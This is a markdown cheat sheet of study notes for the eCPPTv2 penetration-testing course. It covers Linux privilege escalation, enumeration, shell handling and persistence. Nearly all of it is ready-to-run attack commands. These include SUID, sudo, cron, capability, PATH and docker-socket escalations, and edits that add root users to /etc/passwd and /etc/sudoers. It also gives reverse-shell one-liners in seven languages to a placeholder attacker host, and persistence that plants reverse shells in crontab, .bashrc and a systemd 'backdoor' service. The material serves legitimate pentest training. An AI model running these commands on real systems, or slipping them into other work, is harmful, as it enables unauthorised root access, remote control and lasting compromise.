# Linux Security - eCPPTv2

## Overview
Linux security concepts including privilege escalation, enumeration, and exploitation techniques.

**Sources**: 
- [johnermac.github.io](https://johnermac.github.io/notes/ecppt/linux/)
- [dev-angelist/eCPPTv2-PTP-Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)

## Linux Basics

### File System
- `/` - Root directory
- `/etc` - Configuration files
- `/home` - User home directories
- `/var` - Variable data
- `/tmp` - Temporary files
- `/usr` - User programs
- `/bin` - Binary executables
- `/sbin` - System binaries

### Permissions
```bash
# Read, Write, Execute
rwx rwx rwx
user group other

# Numeric representation
755 = rwxr-xr-x
644 = rw-r--r--
```

### Common Commands
```bash
# File operations
ls, cd, pwd, cat, less, more, head, tail
find, locate, which, whereis
chmod, chown, chgrp

# Process management
ps, top, htop, kill, pkill
jobs, fg, bg, nohup

# Network
netstat, ss, ifconfig, ip
nmap, nc, curl, wget

# System info
uname, whoami, id, groups
cat /etc/passwd, cat /etc/shadow
```

## Privilege Escalation

### SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Common vulnerable SUID binaries
- /usr/bin/find
- /usr/bin/nmap (old versions)
- /usr/bin/vim
- /usr/bin/less
- /usr/bin/more
- /usr/bin/awk
- /usr/bin/cp
- /usr/bin/nano

# Exploit SUID find
find /etc/passwd -exec /bin/sh \;
find . -exec /bin/sh \;

# Exploit SUID nmap (old versions)
nmap --interactive
nmap> !sh

# Exploit SUID vim
vim
:set shell=/bin/sh
:shell

# Exploit SUID less/more
less /etc/passwd
!/bin/sh

more /etc/passwd
!/bin/sh
```

### Sudo Misconfigurations
```bash
# Check sudo permissions
sudo -l

# Common sudo exploits
sudo -u root /usr/bin/vim
sudo -u root /usr/bin/nmap --interactive

# Exploit sudo with vim
sudo vim -c ':!/bin/sh'

# Exploit sudo with less/more
sudo less /etc/passwd
!/bin/sh

# Exploit sudo with awk
sudo awk 'BEGIN {system("/bin/sh")}'

# Exploit sudo with find
sudo find /etc -exec /bin/sh \;

# Exploit sudo with cp
sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh -p

# Exploit sudo with tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Exploit sudo with git
sudo git -p help config
!/bin/sh

# Exploit sudo with python
sudo python -c 'import os; os.system("/bin/sh")'
```

### Cron Jobs
```bash
# List cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Check for writable cron scripts
find /etc/cron* -type f -perm -0002 2>/dev/null
find /var/spool/cron -type f -perm -0002 2>/dev/null

# Exploit writable cron script
# If /etc/cron.daily/script.sh is writable:
echo '#!/bin/bash' > /etc/cron.daily/script.sh
echo 'bash -i >& /dev/tcp/attacker/port 0>&1' >> /etc/cron.daily/script.sh
chmod +x /etc/cron.daily/script.sh

# Exploit wildcard in cron
# If cron runs: tar -czf /backup/*.sh
# Create files: --checkpoint=1 and --checkpoint-action=exec=/bin/sh
touch /backup/--checkpoint=1
touch /backup/--checkpoint-action=exec=/bin/sh
```

### Capabilities
```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Exploit capabilities
# If python has cap_setuid+ep:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# If tar has cap_dac_read_search+ep:
tar -czf /tmp/backup.tar.gz /etc/shadow
```

### Kernel Exploits
```bash
# Check kernel version
uname -a
cat /proc/version
cat /proc/version_signature

# Check system architecture
arch
uname -m

# Search for exploits
searchsploit <kernel version>
searchsploit linux kernel <version>

# Common kernel exploits
# Dirty COW (CVE-2016-5195)
# Dirty Pipe (CVE-2022-0847)
# PwnKit (CVE-2021-4034)

# Compile and run exploit
gcc exploit.c -o exploit
./exploit
```

## Additional Privilege Escalation Techniques

### PATH Hijacking
```bash
# Check PATH
echo $PATH

# Check for writable directories in PATH
find / -writable -type d 2>/dev/null | grep -E "^$(echo $PATH | tr ':' '|')"

# Exploit PATH hijacking
# If /tmp is in PATH and a script runs a command without full path:
cd /tmp
echo '#!/bin/bash' > ls
echo '/bin/bash' >> ls
chmod +x ls
export PATH=/tmp:$PATH
# Wait for script to run 'ls'
```

### Writable /etc/passwd
```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# Add user with root privileges
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
# Or use openssl to generate password hash
openssl passwd -1 -salt salt password
```

### Writable /etc/sudoers
```bash
# Check if /etc/sudoers is writable
ls -la /etc/sudoers

# Add NOPASSWD sudo access
echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

### NFS Misconfiguration
```bash
# Check NFS shares
showmount -e <target>
mount -t nfs <target>:/share /mnt

# If no_root_squash is enabled, create SUID binary
# On attacker machine:
gcc -o shell shell.c
chmod +s shell
# Copy to NFS share and execute
```

### Docker/Container Escape
```bash
# Check if in container
cat /.dockerenv
ls /.dockerenv

# Check for docker socket
ls -la /var/run/docker.sock

# If docker socket is accessible:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LD_PRELOAD
```bash
# If a program runs with sudo and LD_PRELOAD is not restricted:
# Create malicious library
echo 'int system(const char *command) { return 0; }' > /tmp/preload.c
gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so <program>
```

## Enumeration

### System Information
```bash
# OS version
cat /etc/os-release
cat /etc/issue
uname -a

# Users
cat /etc/passwd
cat /etc/shadow
w, who, last

# Groups
cat /etc/group
groups
id
```

### Network Information
```bash
# Network interfaces
ifconfig
ip addr
ip route

# Network connections
netstat -antup
ss -antup
lsof -i

# ARP table
arp -a
ip neigh
```

### Process Information
```bash
# Running processes
ps aux
ps -ef
top
htop

# Process tree
pstree
```

### File System
```bash
# Find interesting files
find / -name "*.txt" 2>/dev/null
find / -name "*.log" 2>/dev/null
find / -name "*.conf" 2>/dev/null
find / -name "*.key" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Find writable files
find / -writable -type f 2>/dev/null

# Find files with specific permissions
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID
find / -perm -1000 -type f 2>/dev/null  # Sticky bit

# Find files owned by current user
find / -user $(whoami) 2>/dev/null

# Find files with specific extensions
find / -name "*.key" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.p12" 2>/dev/null
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# Find configuration files
find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null
find /etc -name "*.conf" 2>/dev/null

# Find backup files
find / -name "*backup*" 2>/dev/null
find / -name "*.bak" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*~" 2>/dev/null
```

## Exploitation

### Shell Upgrades
```bash
# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background with Ctrl+Z, then:
stty raw -echo; fg
```

### File Transfer
```bash
# wget
wget http://<attacker>/file -O /tmp/file

# curl
curl http://<attacker>/file -o /tmp/file

# nc (netcat)
# Receiver
nc -lvnp <port> > file

# Sender
cat file | nc <attacker> <port>
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/<attacker>/<port> 0>&1

# Netcat
nc -e /bin/bash <attacker> <port>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker> <port> >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="<attacker>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("<attacker>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'f=TCPSocket.open("<attacker>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Telnet
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <attacker> <port> >/tmp/f
```

## Automated Enumeration Scripts

### LinPEAS
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer and run
./linpeas.sh
```

### Linux Exploit Suggester
```bash
# Download and run
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### LSE (Linux Smart Enumeration)
```bash
# Download and run
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh
```

### LinEnum
```bash
# Download and run
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

## Persistence

### Cron Jobs
```bash
# Add reverse shell to crontab
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/port 0>&1") | crontab -
```

### SSH Keys
```bash
# Add SSH public key
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### .bashrc / .profile
```bash
# Add reverse shell to .bashrc
echo 'bash -i >& /dev/tcp/attacker/port 0>&1' >> ~/.bashrc
```

### Systemd Service
```bash
# Create systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/port 0>&1'

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

## Tools
- **LinPEAS** - Linux Privilege Escalation Awesome Script
- **Linux Exploit Suggester** - Kernel exploit finder
- **GTFOBins** - Bypass local security restrictions
- **LSE** - Linux Smart Enumeration
- **LinEnum** - Linux enumeration script
- **pspy** - Monitor processes without root
- **pwnkit** - PwnKit exploit (CVE-2021-4034)

## Resources
- **GTFOBins**: https://gtfobins.github.io/
- **Linux Exploit Suggester**: https://github.com/mzet-/linux-exploit-suggester
- **LinPEAS**: https://github.com/carlospolop/PEASS-ng

## Last Updated
January 2025

